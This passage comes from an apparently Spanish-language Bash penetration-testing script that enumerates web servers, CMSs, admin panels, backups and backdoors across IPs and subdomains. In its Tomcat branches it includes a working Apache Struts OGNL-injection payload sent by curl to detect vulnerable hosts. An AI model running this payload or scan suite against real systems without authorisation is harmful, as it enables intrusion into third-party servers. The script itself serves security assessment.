								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios comunes ($subdominio - Tomcat)"								
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200|^401" >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &			
									sleep 2;
								fi									
								
								echo -e "\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m tomcat -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt 
								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								
								sleep 2;
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt   >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 1										
							fi
										
							####################################
				
							
							#######  wordpress (domain) ######
							grep -qi wordpress .enumeracion/"$subdominio"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 		
								wpscan  --update >/dev/null 						
								echo -e "\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
								wpscan --url http://$subdominio/ -_enumerate u --follow-redirection > .enumeracion/"$subdominio"_"$port"_wpscan.txt &
							fi
							###################################	
							
							#######  joomla (domain) ######
							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Revisando vulnerabilidades de joomla ($subdominio)"
								joomscan.sh -u http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_joomscan.txt &
							fi
							###################################	
							
							#######  WAMPSERVER (domain) ######
							grep -qi WAMPSERVER .enumeracion/"$subdominio"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Enumerando WAMPSERVER ($subdominio)"
								wampServer.pl -url http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_WAMPSERVER.txt &
							fi
							###################################	
				
						
							#######  clone site (domain) ####### 									
							cd webClone
								echo -e "\t\t[+] Clonando sitio ($subdominio)"	
								wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate http://$subdominio
								rm index.html.orig 2>/dev/null
							cd ..										
							###################################							
						else
							echo -e "\t\t[+] Redirección o error de proxy detectado"	
						fi												
					done #subdominio
					
					#######  extract URLs ####### 
					cd webClone
						echo ""
						echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
						grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
						lines=`wc -l http.txt  | cut -d " " -f1`
						perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
						paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMAIN"_web_wget2.txt # adicionar http:// a cada linea
						rm http.txt 2>/dev/null
					
						grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
						lines=`wc -l https.txt  | cut -d " " -f1`
						perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
						paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMAIN"_web_wget2.txt  # adicionar https:// a cada linea
						rm https.txt 2>/dev/null						
					cd ../
					###################################				    
					#done 									
				fi #rev por dominio
				################################
				
				################# Comprobar que no haya muchos scripts ejecutandose ########
				while true; do
					free_ram=`free -m | grep -i mem | awk '{print $7}'`		
					perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 	
					if [[ $free_ram -lt $min_ram || $perl_instancias -gt 10  ]];then 
						echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
						sleep 10	
					else		
						break
					fi
				done	
				####################################

				
				#################  Realizar el escaneo por IP  ##############	
				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect" .enumeracion/"$ip"_"$port"_webData.txt
				greprc=$?	
				if [[ $greprc -eq 1 ]];then # no redirecciona o es error de proxy
													
					if [ $internet == "s" ]; then 
						echo -e "\t[+] identificar si el host esta protegido por un WAF "
						wafw00f http://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt										
					fi	
																		
					#######  wordpress (IP) ######
					grep -qi wordpress .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 		
						echo -e "\t\t[+] Revisando vulnerabilidades de wordpress (IP)"
						wpscan  --update >/dev/null
						wpscan --url http://$ip/ -_enumerate u --follow-redirection > .enumeracion/"$ip"_"$port"_wpscan.txt &
					fi
					###########################
				
					#######  joomla (ip) ######
					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 										
						echo -e "\t[+] Revisando vulnerabilidades de joomla (IP)"
						joomscan.sh -u http://$ip/ > .enumeracion/"$ip"_"$port"_joomscan.txt &
					fi
					###################################		

					#######  WAMPSERVER (ip) ######
					grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 										
						echo -e "\t[+] Enumerando WAMPSERVER (IP)"
						wampServer.pl -url http://$ip/ > .enumeracion/"$ip"_"$port"_WAMPSERVER.txt &
					fi
					###################################					
				
					
					
					#######  if the server is IIS ######
					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes
						#nmap -n -p $port --script http_vuln-cve2015-1635 $ip > logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt 2>/dev/null 
						echo "nmap -n -p $port --script=http-iis-webdav_vuln $ip" > logs/vulnerabilidades/"$ip"_"$port"_webdav.txt 2>/dev/null 
						nmap -n -p $port --script=http-iis-webdav_vuln $ip >> logs/vulnerabilidades/"$ip"_"$port"_webdav.txt 2>/dev/null 					
						grep "|" logs/vulnerabilidades/"$ip"_"$port"_webdav.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_webdav.txt 					
						
						echo -e "\t[+] Revisando directorios comunes ($ip -IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2
						
						echo -e "\t[+] Revisando paneles administrativos ($ip -IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_admin.txt 
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
						sleep 2
						
						echo -e "\t[+] Revisando archivos comunes de servidor ($ip -IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						
						echo -e "\t[+] Revisando archivos comunes de sharepoint ($ip -IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m sharepoint -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						
						echo -e "\t[+] Revisando archivos comunes de webservices ($ip -IIS)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webservices -s 0 -q 1  > logs/enumeracion/"$ip"_"$port"_webarchivos.txt 
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
						sleep 2
						
						echo -e "\t[+] Revisando la existencia de backdoors ($ip -IIS)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorIIS -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt  >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						sleep 2
						
						echo -e "\t[+] Revisando la existencia de backups de archivos de configuración ($ip -IIS)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m backupIIS -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt   >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						sleep 2										   
					fi
										
					####################################	
		
		
					#######  if the server is tomcat ######
					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found" 
					greprc=$?				
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
					
						echo -e "\t[+] Revisando Apache struts"					
						curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "http://$ip:$port/" > logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt 2>/dev/null					
						grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt > .vulnerabilidades/"$ip"_"$port"_apacheStruts.txt
						
						echo -e "\t[+] Revisando directorios comunes ($ip -Tomcat)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de tomcat ($ip -Tomcat)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m tomcat -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt 
						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
						sleep 2
						
						echo -e "\t[+] Revisando archivos comunes de servidor ($ip -Tomcat)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt
						sleep 1										
					fi
											
					####################################	
			
			
					#######  if the server is apache ######
					egrep -i "apache|nginx" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
					greprc=$?
					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
													
						#echo -e "\t[+] Revisando vulnerabilidad Struts"
						#echo "nmap -n -p $port $ip --script=http_vuln-cve2017-5638" > logs/vulnerabilidades/"$ip"_"$port"_Struts.txt 2>/dev/null 
						#nmap -n -p $port $ip --script=http_vuln-cve2017-5638 >> logs/vulnerabilidades/"$ip"_"$port"_Struts.txt 2>/dev/null 
						#grep "|" logs/vulnerabilidades/"$ip"_"$port"_Struts.txt > .vulnerabilidades/"$ip"_"$port"_Struts.txt  	
											
						#echo -e "\t[+] Revisando vulnerabilidad cgi"
						#echo "nmap -n -p $port $ip --script=http_vuln-cve2012-1823" > logs/vulnerabilidades/"$ip"_"$port"_cgi.txt 2>/dev/null 
						#nmap -n -p $port $ip --script=http_vuln-cve2012-1823 >> logs/vulnerabilidades/"$ip"_"$port"_cgi.txt 2>/dev/null 
						#grep "|" logs/vulnerabilidades/"$ip"_"$port"_cgi.txt > .vulnerabilidades/"$ip"_"$port"_cgi.txt  	
													
						echo -e "\t[+] Revisando directorios comunes ($ip -Apache/nginx)"	
						web-buster.pl -t $ip -p $port -h 2 -d / -m directorios -s 0 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
						sleep 2	
						echo -e "\t[+] Revisando paneles administrativos ($ip -Apache/nginx)"				
						web-buster.pl -t $ip -p $port -h 2 -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_admin.txt  
						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_admin.txt   >> .enumeracion/"$ip"_"$port"_admin.txt  
						sleep 2
						echo -e "\t[+] Revisando archivos comunes de servidor ($ip -Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
						sleep 2
						echo -e "\t[+] Revisando backups de archivos de configuración ($ip -Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
						sleep 2
						
						egrep -iq "is behind" .enumeracion/"$ip"_"$port"_wafw00f.txt 2>/dev/null
						greprc=$?
						if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
							echo -e "\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
							web-buster.pl -t $ip -p $port -h 2 -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt  
							sleep 2						
						fi		
														
						echo -e "\t[+] Revisando archivos peligrosos ($ip -Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m archivosPeligrosos -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt 
						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  
						sleep 2
						
						echo -e "\t[+] Revisando la existencia de backdoors ($ip -Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m backdoorApache -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_backdoor.txt   | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_backdoor.txt  
						sleep 2
						
						echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip -Apache/nginx)"
						web-buster.pl -t $ip -p $port -h 2 -d / -m divulgacionInformacion -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null 						
																			
					fi						
					####################################						
										
				
					#######  DLINK backdoor ######
					grep -qi alphanetworks .enumeracion/"$ip"_"$port"_webData.txt
					greprc=$?
					if [[ $greprc -eq 0 ]];then 		
						echo -e "\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"
						cat .enumeracion/"$ip"_"$port"_webData.txt >vulnerabilidades/"$ip"_"$port"_dlinkBackdoor.txt 
					fi
					###########################											
				fi # fin si no hay redireccion http --> https 
								
			break
		else
			perl_instancias=`ps aux | grep perl | wc -l`
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 3
		fi
		done # done true			
	done	# done for                       
	
	################# si hay menos de 12 scripts de perl continua el script ##############
	while true; do
		free_ram=`free -m | grep -i mem | awk '{print $7}'`		
		perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
		if [[ $free_ram -lt $min_ram || $perl_instancias -gt 12  ]];then 
			echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
			sleep 10	
		else
			echo "ok"
			break
		fi
	done	
	#################################################################################
	
	#insert clean data	
	insert_data
	
fi # file exists



if [ -f .servicios/web-ssl.txt ]
then    
    
    echo -e "$OKBLUE #################### WEB - SSL (`wc -l .servicios/web-ssl.txt`) ######################$RESET"	    		

	# Extraer informacion web y SSL
	for line in $(cat .servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`						
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
			python_instancias=$((`ps aux | grep get_ssl_cert | wc -l` - 1)) 
			script_instancias=$((perl_instancias + python_instancias))
			
			if [[ $free_ram -gt $min_ram && $script_instancias -lt 10  ]];then 
				echo -e "[+] Escaneando $ip:$port"
				echo -e "\t[+] Obteniendo información web"
				webData.pl -t $ip -p $port -s 1 -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &			
				echo -e "\t[+] Obteniendo información del certificado SSL"
				get_ssl_cert.py $ip $port  2>/dev/null | grep "("> .enumeracion/"$ip"_"$port"_cert.txt  &
				echo -e "\t"	
				sleep 0.5;	
				
				######## revisar por dominio #######
				if grep -q ";" "$prefijo$FILE" 2>/dev/null; then			
					lista_subdominios=`grep $ip $prefijo$FILE | cut -d ";" -f2`
					for subdominio in $lista_subdominios; do					
						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
						webData.pl -t $subdominio -p $port -s 1 -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 4 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 
					done
				fi
				################################	
				
				break
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
				sleep 3										
			fi		
	    done # while true
	 done # for

	 ######## wait to finish ########
	  while true; do
		perl_instancias=$((`ps aux | egrep "webData.pl|get_ssl_cert" | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl/python activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	  ##############################


	for line in $(cat .servicios/web-ssl.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "[+] Escaneando $ip:$port"
		
		while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
				perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
				if [[ $free_ram -gt $min_ram && $perl_instancias -lt 10  ]];then 				
				
				######## revisar por dominio #######
				if grep -q ";" "$prefijo$FILE" 2>/dev/null; then
					lista_subdominios=`grep $ip -a $prefijo$FILE | cut -d ";" -f2`
					for subdominio in $lista_subdominios; do
						echo -e "\t[+] subdominio: $subdominio"	
						egrep -iq "500 Proxy Error" .enumeracion/"$subdominio"_"$port"_webData.txt
						greprc=$?
						if [[ $greprc -eq 1 ]];then # no redirecciona a otro dominio o es error de proxy
													
							if [ $internet == "s" ]; then 	
								echo -e "\t[+] identificar si el host esta protegido por un WAF "
								wafw00f https://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
								grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
							fi	
														
							###  if the server is apache ######
							egrep -i "apache|nginx" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS" # solo el segundo egrep poner "-q"
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
												
								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &								
									sleep 2								
								fi									
								
								echo -e "\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 1 -q 1 >>  logs/enumeracion/"$subdominio"_"$port"_admin.txt 
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_admin.txt  > .enumeracion/"$subdominio"_"$port"_admin.txt 
								sleep 2
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio  -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
								sleep 2
								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
								sleep 2
								
								egrep -iq "is behind" .enumeracion/"$subdominio"_"$port"_wafw00f.txt
								greprc=$?
								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
									echo -e "\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .servicios/cgi.txt; cat .servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
									sleep 2
								fi	
						
								
								echo -e "\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
								sleep 2
								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_backdoor.txt  
								sleep 2
								echo -e "\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m divulgacionInformacion -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$subdominio"_"$port"_divulgacionInformacion.txt 2>/dev/null 
							fi						
							####################################	
							
							#######  if the server is IIS ######
							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS"  # no redirecciona
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
								
								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios ($subdominio - IIS)"
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt &
									sleep 2
								fi									
								
								echo -e "\t[+] Revisando paneles administrativos ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m admin -s 1 -q 1 > logs/enumeracion/"$subdominio"_"$port"_admin.txt
								egrep --color=never "^200" logs/enumeracion/"$subdominio"_"$port"_admin.txt >> .enumeracion/"$subdominio"_"$port"_admin.txt
								sleep 2
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								echo -e "\t[+] Revisando archivos de sharepoint ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								echo -e "\t[+] Revisando archivos de webservices ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								echo -e "\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backdoorIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$subdominio"_"$port"_backdoor.txt  
								sleep 2
								echo -e "\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$subdominio"_"$port"_backdoor.txt  
								sleep 2										   
							fi
										
							####################################	
		
		
							#######  if the server is tomcat ######
							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
							greprc=$?				
							if [[ $greprc -eq 0 && ! -f .enumeracion/"$subdominio"_"$port"_webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
								echo -e "\t[+] Revisando Apache struts"
								curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$subdominio:$port/" > logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt  2>/dev/null
								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt > .vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt
								
								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
									echo -e "\t[+] Revisando directorios y archivos comunes ($subdominio - Tomcat)"
									web-buster.pl -t $subdominio -p $port -h 2 -d / -m directorios -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
									sleep 2
								fi								
								
								echo -e "\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^401" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
								sleep 2
								echo -e "\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
								web-buster.pl -t $subdominio -p $port -h 2 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  							
								sleep 1										
							fi
										
							####################################
								
						
							#######  wordpress (dominio) ######
							grep -qi wordpress .enumeracion/"$subdominio"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 		
								echo -e "\t\t[+] Revisando vulnerabilidades de wordpress"						    
								wpscan --url https://$subdominio/ -_enumerate u --follow-redirection > .enumeracion/"$subdominio"_"$port"_wpscan.txt &
							fi
							###########################	
							
							#######  joomla (domain) ######
							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Revisando vulnerabilidades de joomla"
								joomscan.sh -u https://$subdominio/ > .enumeracion/"$subdominio"_"$port"_joomscan.txt &
							fi
							###################################	
							
							#######  WAMPSERVER (domain) ######
